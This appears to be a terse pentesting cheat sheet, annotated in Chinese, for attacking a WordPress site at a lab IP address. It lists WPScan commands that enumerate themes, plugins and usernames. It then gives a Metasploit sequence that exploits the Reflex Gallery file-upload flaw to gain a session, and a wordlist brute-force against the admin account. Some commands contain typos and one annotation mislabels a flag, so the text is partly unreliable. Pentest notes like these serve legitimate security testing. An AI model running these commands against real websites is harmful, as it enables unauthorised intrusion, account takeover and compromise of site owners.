#######################
#######  wpscan  ######
#######################

git clone https://github.com/wpscanteam/wpscan.git
wpscan.rb–h
wpscan -update
wpscan –u http://192.168.0.101/wordpress/
wpsca –u http://192.168.0.101/wordpress --enumerate t    主题扫描
wpscan -u http://192.168.0.101/wordpress/ --enumerate vt    扫描主题中存在的漏洞
wpscan -u http://192.168.0.101/wordpress/ --enumerate p    插件扫描
wpscan -u http://192.168.0.101/wordpress/ --enumerate vt    扫描目标插件中的安全漏洞

###结合Metasploit利用插件中的漏洞
use exploit/unix/webapp/wp_reflexgallery_file_upload
set rhost 192.168.0.101
set targetURI /wordpress/
exploit
Sysinfo

wpscan -u http://192.168.0.101/wordpress/ --enumerate u    枚举WordPress用户名
###导出用户名数据表
wpscan -u http://192.168.0.101/wordpress/ -e at -e ap -e u
–e at : enumerate all themes of targeted website
–e ap: enumerate all plugins of targeted website
–e u: enumerate all usernames of targeted website
###WPScan进行暴力破解
wpscan –u http://192.168.0.101/wordpress/ --wordlist /root/Desktop/dict.txt --username admin
